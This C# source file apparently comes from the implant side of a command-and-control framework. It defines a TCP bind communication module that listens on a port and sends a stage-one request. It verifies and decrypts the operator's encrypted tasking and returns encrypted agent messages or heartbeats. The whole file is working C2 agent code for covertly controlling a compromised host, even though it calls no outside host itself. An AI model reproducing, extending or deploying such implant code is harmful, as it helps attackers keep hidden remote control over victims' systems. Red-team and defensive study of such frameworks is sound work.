using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class TcpCommModule : CommModule
{
    static string BindAddress;
    static int BindPort;

    static ManualResetEvent Status = new ManualResetEvent(false);

    public TcpCommModule(string agentID, string bindAddress, int bindPort) : base(agentID)
    {
        BindAddress = bindAddress;
        BindPort = bindPort;
    }

    public override void Start(CryptoController crypto)
    {
        base.Start(crypto);

        var listener = new TcpListener(IPAddress.Parse(BindAddress), BindPort);
        listener.Start();

        while (ModuleStatus == ModuleStatus.Running)
        {
            Status.Reset();
            listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), listener);
            Status.WaitOne();
        }
    }

    public void QueueStageRequest()
    {
        var message = new AgentMessage
        {
            Metadata = base.GetMetadata(),
            Data = new C2Data
            {
                Module = "Core",
                Command = "StageOneRequest"
            }
        };

        Outbound.Enqueue(message);
    }

    private void AcceptCallback(IAsyncResult ar)
    {
        Status.Set();

        var listener = ar.AsyncState as TcpListener;

        if (ModuleStatus == ModuleStatus.Running)
        {
            var handler = listener.EndAcceptTcpClient(ar);
            var stream = handler.GetStream();
            var state = new CommStateObject
            {
                Worker = handler
            };

            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
        }
    }

    private void ReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var stream = (state.Worker as TcpClient).GetStream();
        var bytesRead = stream.EndRead(ar);

        if (bytesRead > 0)
        {
            var dataReceived = state.Buffer.TrimBytes();

            if (bytesRead == state.Buffer.Length)
            {
                if (state.SwapBuffer != null)
                {
                    var tmp = state.SwapBuffer;
                    state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                    Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
                }
                else
                {
                    state.SwapBuffer = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
                }

                Array.Clear(state.Buffer, 0, state.Buffer.Length);
                stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
            }
            else
            {
                byte[] final;

                if (state.SwapBuffer != null)
                {
                    final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                    Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                    Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
                }
                else
                {
                    final = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
                }

                var finalData = final.TrimBytes();

                if (Crypto.VerifyHMAC(finalData))
                {
                    var inbound = Crypto.Decrypt<List<AgentMessage>>(finalData);

                    if (inbound.Count > 0)
                    {
                        foreach (var dataIn in inbound)
                        {
                            Inbound.Enqueue(dataIn);
                        }
                    }
                }

                var outbound = new List<AgentMessage>();

                if (Outbound.Count > 0)
                {
                    while (Outbound.Count != 0)
                    {
                        outbound.Add(Outbound.Dequeue());
                    }
                }
                else
                {
                    outbound.Add(new AgentMessage
                    {
                        IdempotencyKey = Guid.NewGuid().ToString(),
                        Metadata = base.GetMetadata(),
                        Data = new C2Data()
                    });
                }

                var dataToSend = Crypto.Encrypt(outbound);

                SendDataToClient(stream, dataToSend);
            }
        }
    }

    private void SendDataToClient(NetworkStream stream, byte[] dataToSend)
    {
        stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
    }

    private void WriteCallback(IAsyncResult ar)
    {
        var stream = ar.AsyncState as NetworkStream;
        stream.EndWrite(ar);
        stream.Dispose();
    }
}